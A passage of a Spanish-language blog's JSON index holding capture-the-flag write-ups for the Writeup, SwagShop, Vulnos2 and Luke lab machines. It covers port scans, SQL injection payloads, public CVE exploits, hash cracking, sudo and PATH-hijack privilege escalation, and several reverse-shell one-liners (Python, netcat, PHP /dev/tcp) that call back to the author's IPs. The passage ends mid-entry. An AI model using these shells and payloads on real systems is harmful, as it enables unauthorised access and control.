{\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     MASSCAN \u0026amp; NMAP Escaneo de puertos TCP/UDP.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  root@sckull:~/htb/writeup# masscan -p1-65535,U:1-65535 10.10.10.138 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-06-14 23:30:31 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 80/tcp on 10.10.10.138 Discovered open port 22/tcp on 10.10.10.138 Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-14 17:38 CST Nmap scan report for 10.10.10.138 Host is up (0.24s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0) | ssh-hostkey: | 2048 dd:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 (RSA) | 256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA) |_ 256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519) 80/tcp open http Apache httpd 2.4.25 ((Debian)) | http-robots.txt: 1 disallowed entry |_/writeup/ |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Nothing here yet. Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 17.79 seconds   HTTP - Puerto 80 Al visitar el puerto 80 en http nos muestra una pagina con un mensaje en el cual nos indica que la pagina tiene un script anti ddos.\nRobots.txt Intentamos utilizar gobuster, dirb y wfuzz para busqueda de directorios y archivos pero por el script que nos indica en la pagina principal no pudimos realizar dicha busqueda por lo que visitamos el archivo robots.txt de la pagina principal y nos muestra que esta \u0026ldquo;oculto\u0026rdquo; /writeup/, al visitar esta pagina nos muestra una serie de writeups de maquinas que ya fueron retiradas de hackthebox.\nCMS Made Simple Utilizamos la extension para firefox Wappalyzer la cual nos ayuda a identificar el tipo de CMS, Web Server, Programming Language y Operating Ssytem de una pagina web. Al utilizar esta extension en la pagina nos muestra lo mencionado anteriormente.\nSabiendo esto buscamos exploits que puedan afectar a este CMS con Searchsploit.\nEncontramos varios exploits que afectan a este CMS cada uno de ellos en distintas versiones y tipos de vulnerabilidad, para esta version utilizamos CMS Made Simple \u0026lt; 2.2.10 - SQL Injection (CVE-2019-9053).\nCMS Made Simple - SQLI Utilizamos el exploit contra la pagina y nos muestra las credenciales del usuario jkr el salto de la contraseña y la contraseña.\n1 2 3 4 5  root@sckull:~/htb/writeup# python CVE-2019-9053.py -u http://10.10.10.138/writeup/ [+] Salt for password found: 5a599ef579066807 [+] Username found: jkr [+] Email found: jkr@writeup.htb [+] Password found: 62def4866937f08cc13bab43bb14e6f7   Hashcat Para obtener la contraseña en texto plano utilizamos Hashcat, escribimos el hash y el salto de la contraseña en un archivo para utilizarlo con hashcat y un diccionario.\nContraseña:salto\n62def4866937f08cc13bab43bb14e6f7:5a599ef579066807\nComando hashcat:\n1  ./hashcat64.bin -m 20 62def4866937f08cc13bab43bb14e6f7:5a599ef579066807 ../rockyou.txt -o huehue.txt   Contraseña crackeada:\n62def4866937f08cc13bab43bb14e6f7:5a599ef579066807:raykayjay9\nSSH - User Cuando obtuvimos nuestra usuario y contraseña con el exploit la probamos en el panel de administracion del CMS que esta corriendo en el puerto 80 pero no tuvimos suerte de acceder por ese lado, por lo que utilizamos las credenciales en el servicio SSH y nos logeamos satisfactoriamente.\nFlag user.txt:\nPRIVILEGE ESCALATION Utilizamos pspy para observar los procesos que se ejecutan, encontramos que un proceso se ejecuta a cada vez que se inicia sesion en el servicio de SSH.\nVemos que este proceso env donde se le pasa la variable $PATH del usuario root, luego de eso ejecuta un comando:\n1  run-parts --lsbsysinit /etc/update-motd.d \u0026gt; /run/motd.dynamic.new   Buscamos en que carpeta se encuentra run-parts:\nRevisamos la variable PATH del usuario root y las carpetas donde tenemos permisos de escritura:\n1  PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin   Carpetas donde tenemos permisos de escritura:\nfind / -writable -type d 2\u0026gt;/dev/null Encontramos una carpeta que el usuario root utiliza en su variable PATH (/usr/local/sbin/), esta direccion es la primera que se utiliza para poder \u0026ldquo;encontrar\u0026rdquo; los programas/scripts/etc que se escriban en la terminal de comandos, en este caso la primera direccion donde el usuario root va a buscar run-parts es /usr/local/sbin/.\nSabiendo esto, podemos escribir un comando/reverse shell dentro de /usr/local/sbin/run-parts el cual va ser ejecutado por el usuario root. Vamos hacer una prueba con un ping hacia nuestra maquina:\necho \u0026quot;/bin/ping -c 2 10.10.15.122\u0026quot; \u0026gt; /usr/local/sbin/run-parts \u0026amp;\u0026amp; chmod +x /usr/local/sbin/run-parts La respuesta la vemos reflejada con tcpdump:\nAhora que tuvimos una respuesta de la maquina vamos a agregar nuestra shell inversa al archivo y vamos a poner a la escucha netcat localmente:\n1  echo \u0026#34; python -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\u0026#34;10.10.15.122\\\u0026#34;,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\u0026#34;/bin/sh\\\u0026#34;,\\\u0026#34;-i\\\u0026#34;]);\u0026#39; \u0026#34; \u0026gt; /usr/local/sbin/run-parts \u0026amp;\u0026amp; chmod +x /usr/local/sbin/run-parts   Obtenemos nuestra shell inversa como usuario root y nuestra flag root.txt:\n","description":"Writeup es una maquina de HackTheBox. Encontramos una vulnerabilidad de SQL Injection en CMS Made Simple donde encontramos credenciales para acceder por SSH. Modificamos un script utilizado por un CronJob para escalar privilegios.","id":130,"section":"posts","tags":["CMS Made Simple","cron"],"title":"Hack The Box - Writeup","uri":"https://sckull.github.io/posts/writeup/"},{"content":"  SwagShop es una maquina de HackTheBox vemos Magento con una vulnerabilidad que permite crear usuarios lo que nos permitio ejecutar una shell inversa explotando una segunda vulnerabilidad. Escalamos privilegios utilizando ejecutando una shell con Vi.\nInformacion de la Maquina    Nombre SwagShop      OS Linux   Puntos 20   Dificultad Facil   IP 10.10.10.140   Maker ch4p    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[5.6, 6.7, 7.8, 2.2, 3.3], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[3, 7, 9, 1, 3], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     MASSCAN \u0026amp; NMAP Escaneo de puertos udp/tcp.\n1 2 3 4 5 6 7 8  root@sckull:~/htb/swagshop# masscan -p1-65535,U:1-65535 10.10.10.140 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-05-13 17:43:20 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 22/tcp on 10.10.10.140 Discovered open port 80/tcp on 10.10.10.140   EScaneo de puertos 22, 80.\n1 2 3 4 5 6 7 8 9 10 11  # Nmap 7.70 scan initiated Mon May 13 12:54:19 2019 as: nmap -sV -p22,80 -o nmap.scan 10.10.10.140 Nmap scan report for 10.10.10.140 Host is up (0.19s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon May 13 12:54:27 2019 -- 1 IP address (1 host up) scanned in 8.08 seconds   HTTP Visitamos la pagina principal y nos muestra una tienda con algunos productos.\nGOBUSTER Algunos directorios y paginas encontradas con gobuster.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  ===================================================== Gobuster v2.0.1 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://10.10.10.140/ [+] Threads : 10 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Extensions : php,txt,html [+] Timeout : 10s ===================================================== 2019/05/13 13:05:05 Starting gobuster ===================================================== /api.php (Status: 200) /app (Status: 301) /cron.php (Status: 200) /downloader (Status: 301) /errors (Status: 301) /favicon.ico (Status: 200) /includes (Status: 301) /index.php (Status: 200) /index.php (Status: 200) /install.php (Status: 200) /js (Status: 301) /lib (Status: 301) /LICENSE.txt (Status: 200) /LICENSE.html (Status: 200) /media (Status: 301) /pkginfo (Status: 301) /server-status (Status: 403) /shell (Status: 301) /skin (Status: 301) /var (Status: 301) ===================================================== 2019/05/13 13:08:09 Finished =====================================================   Magento eCommerce - Exploit Al investigar un poco acerca de la plataforma nos encontramos un exploit el cual crea un usuario dentro de la base de datos con permisos de administracion, editamos un poco el exploit especificamente el usuario (username=\u0026quot;sckull\u0026quot;) y contraseña (password=\u0026quot;sckull\u0026quot;) para mostrar une explotacion exitosa tambien debemos de cambiar el target con el valor de target = \u0026quot;http://10.10.10.140/index.php\u0026quot;, mas informacion acerca de esta vulnerabilidad.\nCVE:2015-1397\nObtenemos acceso a la plataforma de Magento como administrador.\nAhora que tenemos acceso a la plataforma con nuestras credenciales podemos utilizar un segundo exploit el cual executa comandos en la maquina, para ello debemos de agregar usuario (username) y contraseña (password) que creamos con el anterior exploit de igual forma agregamos la fecha que se encuentra en /app/etc/local.xml.\nMagento CE \u0026lt; 1.9.0.1 Post Auth RCE\nExplotacion SHELL - www-data Ahora que podemos ejecutar comandos por medio de un exploit vamos a obtener una shell inversa.\nCMD:\n1  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.15.31 9090 \u0026gt;/tmp/f   Actualizamos nuestra shell a una mas estable con python.\nSHELL:\nDentro de la carpeta principal del usuario haris encontramos nuestra bandera user.txt.\nPrivilege Escalation Ahora que tenemos una shell con acceso de privilegio bajo hacemos una pequeña enumeracion de los programas que podamos, por medio del comando sudo ejecutar, encontramos que podemos ejecutar vi con privilegios de administracion.\nPara mostrar los comandos que podemos ejecutar con sudo utilizamos sudo -l.\nSudo - Privilege Escalation\nAbusing sudo\nUtilizamos vi para poder abrir una shell como root para ello vamos a utilizar un archivo que se encuentra en /var/www/html/ ya que es la direccion donde tiene permitido vi ejecutarse o editar archivos mediante sudo.\n1  sudo /usr/bin/vi /var/www/html/install.php   Luego de que se habra el editor presionamos la tecla ESC y escribimos :shell y se abrira una shell como usario root.\nObtenemos nuestra bandera root.txt.\n","description":"SwagShop es una maquina de HackTheBox vemos Magento con una vulnerabilidad que permite crear usuarios lo que nos permitio ejecutar una shell inversa explotando una segunda vulnerabilidad. Escalamos privilegios utilizando ejecutando una shell con Vi.","id":131,"section":"posts","tags":["Magento eCommerce","vim"],"title":"Hack The Box - SwagShop","uri":"https://sckull.github.io/posts/swagshop/"},{"content":"  Vulnos2 es una maquina de TryHackMe, encontramos multiples vulnerabilidades en OpenDocMan las cuales explotamos para obtener credenciales y acceer al panel de Drupal, que luego nos permitio ejecutar una shell inversa. Ejecutamos un exploit que afecta al Kernel de Linux para escalar privilegios.\nRoom    Titulo Vulnos2      Descripción Just a typical web server, nothing to be suspicious of here.   Puntos *   Dificultad Media   Maker DarkStar7471     MASSCAN \u0026amp; NMAP Escaneo de puertos tcp/udp y servicios.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57  root@kali:~/trymehack/vulnos2# masscan -p1-65535,U:1-65535 10.10.169.208 --rate=1000 -e tun0 Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-09-19 03:46:19 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 22/tcp on 10.10.169.208 Discovered open port 80/tcp on 10.10.169.208 # Nmap 7.80 scan initiated Wed Sep 18 23:47:13 2019 as: nmap -sV -p- --min-rate 1000 -o nmap.scan 10.10.169.208 Warning: 10.10.169.208 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.169.208 Host is up (0.18s latency). Not shown: 65517 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.6 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.7 ((Ubuntu)) 6667/tcp open irc ngircd 10337/tcp filtered unknown 12017/tcp filtered unknown 13034/tcp filtered unknown 13725/tcp filtered unknown 15125/tcp filtered unknown 27879/tcp filtered unknown 32710/tcp filtered unknown 33826/tcp filtered unknown 36395/tcp filtered unknown 36503/tcp filtered unknown 45704/tcp filtered unknown 46157/tcp filtered unknown 46605/tcp filtered unknown 49823/tcp filtered unknown 60384/tcp filtered unknown Service Info: Host: irc.example.net; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Sep 18 23:49:32 2019 -- 1 IP address (1 host up) scanned in 139.20 seconds # Nmap 7.80 scan initiated Wed Sep 18 23:50:25 2019 as: nmap -sV -sC -p 22,80,6667 -o nmap_sv.scan 10.10.169.208 Nmap scan report for 10.10.169.208 Host is up (1.4s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.6 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 f5:4d:c8:e7:8b:c1:b2:11:95:24:fd:0e:4c:3c:3b:3b (DSA) | 2048 ff:19:33:7a:c1:ee:b5:d0:dc:66:51:da:f0:6e:fc:48 (RSA) | 256 ae:d7:6f:cc:ed:4a:82:8b:e8:66:a5:11:7a:11:5f:86 (ECDSA) |_ 256 71:bc:6b:7b:56:02:a4:8e:ce:1c:8e:a6:1e:3a:37:94 (ED25519) 80/tcp open http Apache httpd 2.4.7 ((Ubuntu)) |_http-server-header: Apache/2.4.7 (Ubuntu) |_http-title: VulnOSv2 6667/tcp open irc ngircd Service Info: Host: irc.example.net; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Sep 18 23:50:59 2019 -- 1 IP address (1 host up) scanned in 34.28 seconds   WHATWEB HTTP Pagina en el puerto 80.\nDIRBUSTER Realizamos una busqueda de direcotrios, archivos html y txt con dirbuster.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  root@kali:~/trymehack/vulnos2# gobuster dir -u http://10.10.169.208/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 15 =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.169.208/ [+] Threads: 15 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: php,html,txt [+] Timeout: 10s =============================================================== 2019/09/18 23:53:44 Starting gobuster =============================================================== /index.html (Status: 200) /index.html (Status: 200) /javascript (Status: 301) /server-status (Status: 403) =============================================================== 2019/09/18 23:58:34 Finished ===============================================================   HTTP - /jabc/ Encontramos dentro de la pagina principla un enlace que nos redirige hacia otra pagina.\nDentro de la pagina de Documentation a simple vista se ve que no hay contenido de esta pagina al analizar el codigo fuente de la pagina, observamos que existe texto oculto por razones de \u0026ldquo;seguridad\u0026rdquo;. En el texto nos indica que para visitar la documentacion de la pagina visitemos /jabcd0cs/ e iniciemos sesion con guest/guest.\nHTTP - /jabcd0cs/ Visitamos la pagina y nos muestra un panel para iniciar sesion.\nAl iniciar sesion en la plataforma nos muestra un panel de control.\nVemos que la plataforma es OpenDocMan v1.2.7.\nOpenDocMan 1.2.7 - Multiple Vulnerabilities Al investgar un poco mas acerca de esta plataforma encontramos que en especifico esta version de OpenDocMan tiene dos vulnerabilidades. La primera es una vulnerabilidad de Inyeccion de SQL y la segunda Improper Access Control.\nSQL Injection - OpenDocMan 1.2.7 Comprobamos si la vulnerabilidad de SQLi esta presente en la plataforma con la url y parametros para ver el usuario (user()).\nPayload:\najax_udf.php?q=1\u0026amp;add_value=odm_user%20UNION%20SELECT%201,user%28%29,3,4,5,6,7,8,9 Vemos que la vulnerabilidad esta presente ya que nos muestra el usuario. Para obtener los datos de la base de datos, utilizamos burpsuite para interceptar el trafico, guardamos el trafico del payload de SQLi de esta plataforma en un archivo response.req y utilizamos sqlmap con este archivo.\nresponse.req\nSQLMAP Comando:\n1  sqlmap -r response.req --dbs   Database: jabcd0cs [15 tables] +-------------------+ | odm_access_log | | odm_admin | | odm_category | | odm_data | | odm_department | | odm_dept_perms | | odm_dept_reviewer | | odm_filetypes | | odm_log | | odm_odmsys | | odm_rights | | odm_settings | | odm_udf | | odm_user | | odm_user_perms | +-------------------+ Database: jabcd0cs Table: odm_user [2 entries] +----+-------------+--------------------+----------+----------------------------------+-----------+------------+------------+---------------+ | id | phone | Email | username | password | last_name | first_name | department | pw_reset_code | +----+-------------+--------------------+----------+----------------------------------+-----------+------------+------------+---------------+ | 1 | 5555551212 | webmin@example.com | webmin | b78aae356709f8c31118ea613980954b | min | web | 2 | \u0026lt;blank\u0026gt; | | 2 | 555 5555555 | guest@example.com | guest | 084e0343a0486ff05530df6c705c8bb4 | guest | guest | 2 | NULL | +----+-------------+--------------------+----------+----------------------------------+-----------+------------+------------+---------------+ Utilizamos md5online.org para obtener la contraseña del hash md5 del usuario webadmin.\nCredenciales:\nwebmin:webmin1980 guest:guest SHELL - PHP Ya que tenemos las credenciales de administrador regresamos a la pagina principal /jabc/ y visitamos el panel de inicio de sesion y utilizamos las credenciales (webmin:webmin1980), ya que tenemos control de las paginas habilitamos el modulo de PHP (PHP Filter), luego de esto agregamos codigo php con nuestra shell inversa a la pagina de \u0026lsquo;Documentation\u0026rsquo;.\nPHP Modulo:\nCodigo PHP:\n1 2 3  \u0026lt;?php exec(\u0026#34;/bin/bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.8.1.72/1337 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;); ?\u0026gt;   Netcat:\nPonemos a la escucha nuestra maquina con netcat y el puerto 1337.\nPRIVILEGE ESCALATION Verificamos la version del kernel de la maquina y verificamos si existe un exploit para esa version con searchsploit.\nVersion de Kernel:\nSearchsploit:\nDescargamos el exploit, lo compilamos y lo descargamos en la maquina, le damos permisos al archivo de ejecucion, ejecutamos el archivo y obtenemos permisos root.\nObtenemos nuestra flag en /root/flag.txt.\nExploitDB:\nOpenDocMan 1.2.7 - Multiple Vulnerabilities\nLinux Kernel 3.13.0 \u0026lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - \u0026lsquo;overlayfs\u0026rsquo; Local Privilege Escalation\n","description":"Vulnos2 es una maquina de TryHackMe, encontramos multiples vulnerabilidades en OpenDocMan las cuales explotamos para obtener credenciales y acceer al panel de Drupal, que luego nos permitio ejecutar una shell inversa. Ejecutamos un exploit que afecta al Kernel de Linux para escalar privilegios.","id":132,"section":"posts","tags":["jabc-docs","sqli","sqlmap","kernel"],"title":"TryHackMe - Vulnos2","uri":"https://sckull.github.io/posts/vulnos2/"},{"content":"  En Luke descubrimos credenciales las cuales permitieron autenticarnos en el puerto 3000 donde obtuvimos nuevas credenciales para el panel administrativo que posteriormente nos dio acceso por Ajenti donde ejecutamos una terminal con acceso privilegiado.\nInformacion de la Maquina    Nombre Luke      OS FreeBSD   Puntos 30   Dificultad Media   IP 10.10.10.137   Maker H4d3s    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[8.5, 3.7, 3.1, 6.9, 6.3], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[0, 0, 0, 0, 0], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     MASSCAN \u0026amp; NMAP Escaneo de puertos tcp/udp y su servicio.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34  masscan -p1-65535,U:1-65535 10.10.10.137 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-05-28 21:04:45 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 8000/tcp on 10.10.10.137 Discovered open port 3000/tcp on 10.10.10.137 Discovered open port 80/tcp on 10.10.10.137 Discovered open port 21/tcp on 10.10.10.137 Discovered open port 22/tcp on 10.10.10.137 nmap -sV -p8000,3000,80,21,22 10.10.10.137 -o nmap.scan Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-28 16:28 CDT Nmap scan report for 10.10.10.137 Host is up (1.2s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3+ (ext.1) 22/tcp open ssh? 80/tcp open http Apache httpd 2.4.38 ((FreeBSD) PHP/7.3.3) 3000/tcp open http Node.js Express framework 8000/tcp open http-alt 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port8000-TCP:V=7.70%I=7%D=5/28%Time=5CEDA82A%P=x86_64-pc-linux-gnu%r(He SF:lp,42,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\nCo SF:ntent-length:\\x200\\r\\n\\r\\n\u0026#34;)%r(SSLSessionReq,42,\u0026#34;HTTP/1\\.1\\x20400\\x20Ba SF:d\\x20Request\\r\\nConnection:\\x20close\\r\\nContent-length:\\x200\\r\\n\\r\\n\u0026#34;)% SF:r(LDAPSearchReq,42,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x SF:20close\\r\\nContent-length:\\x200\\r\\n\\r\\n\u0026#34;)%r(SIPOptions,42,\u0026#34;HTTP/1\\.1\\x2 SF:0400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\nContent-length:\\x200\\ SF:r\\n\\r\\n\u0026#34;); Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 190.94 seconds   FTP Ingresamos al servicio de FTP con las credenciales tipicas de anonymous y encontramos un archivo, for_Chihiro.txt.\nfor_Chihiro.txt\n1 2 3 4 5 6 7  Dear Chihiro !! As you told me that you wanted to learn Web Development and Frontend, I can give you a little push by showing the sources of the actual website I\u0026#39;ve created . Normally you should know where to look but hurry up because I will delete them soon because of our security policies ! Derry   HTTP - Puerto 80 GOBUSTER - Puerto 80 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  gobuster -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.137/ -np -t 15 -x php,html,txt ===================================================== Gobuster v2.0.1 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://10.10.10.137/ [+] Threads : 15 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Extensions : txt,php,html [+] Timeout : 10s ===================================================== 2019/05/28 17:39:33 Starting gobuster ===================================================== /cgi-bin/.html (Status: 403) /config.php (Status: 200) /css (Status: 301) /index.html (Status: 200) /index.html (Status: 200) /js (Status: 301) /LICENSE (Status: 200) /login.php (Status: 200) /management (Status: 301) /member (Status: 301) /vendor (Status: 301) ===================================================== 2019/05/28 17:46:34 Finished =====================================================   /config.php 1 2 3 4 5  $dbHost = \u0026#39;localhost\u0026#39;; $dbUsername = \u0026#39;root\u0026#39;; $dbPassword = \u0026#39;Zk6heYCyv6ZE9Xcg\u0026#39;; $db = \u0026#34;login\u0026#34;; $conn = new mysqli($dbHost, $dbUsername, $dbPassword,$db) or die(\u0026#34;Connect failed: %s\\n\u0026#34;. $conn -\u0026gt; error);   /management /login.php PUERTO 8000 En el puerto 8000 encontramos un panel de logeo para la plataforma Ajenti.\nEn este punto utilizamos la contraseña y usuario que encontramos en config.php en los diferentes paneles de logeo pero no tuvimos acceso en ninguno de ellos con las credenciales.\nGOBUSTER - Puerto 3000 Solo encontramos directorios para solicitudes de nodejs o json.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  gobuster -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.137:3000/ -np -t 15 -x php,html,txt,js ===================================================== Gobuster v2.0.1 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://10.10.10.137:3000/ [+] Threads : 15 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Extensions : html,txt,js,php [+] Timeout : 10s ===================================================== 2019/05/28 17:58:23 Starting gobuster ===================================================== /login (Status: 200) /Login (Status: 200) /users (Status: 200) ===================================================== 2019/05/28 18:05:20 Finished =====================================================   API REQUESTS Realizamos un escaneo de directorios con DIRBUSTER y obtuvimos dos \u0026ldquo;directorios\u0026rdquo; más en /users.\n1 2 3 4  /users /users/Admin /users/admin /users/ADMiN   Al visitar /login y /Login nos muestra el siguiente mensaje:\n1  \u0026#34;please auth\u0026#34;   Al visitar /users:\n1  {\u0026#34;success\u0026#34;:false,\u0026#34;message\u0026#34;:\u0026#34;Auth token is not supplied\u0026#34;}   Realizamos una busqueda de los mensajes que nos mostraba la pagina web al visitar cada uno de los \u0026ldquo;directorios\u0026rdquo;, encontramos una pagina que habal sobre tokens.\nINFO: Token Authentication - Nodejs\nPara obtener nuestro token utilizamos el siguiente request con curl, añadimos la contraseña que encontramos en la pagina config.php, usamos el usuario admin para el request.\n1  curl --header \u0026#34;Content-Type: application/json\u0026#34; --request POST --data \u0026#39;{\u0026#34;password\u0026#34;:\u0026#34;Zk6heYCyv6ZE9Xcg\u0026#34;, \u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34;}\u0026#39; http://10.10.10.137:3000/login   El resultado del request, obtuvimos nuestro token de autenticacion.\n1  {\u0026#34;success\u0026#34;:true,\u0026#34;message\u0026#34;:\u0026#34;Authentication 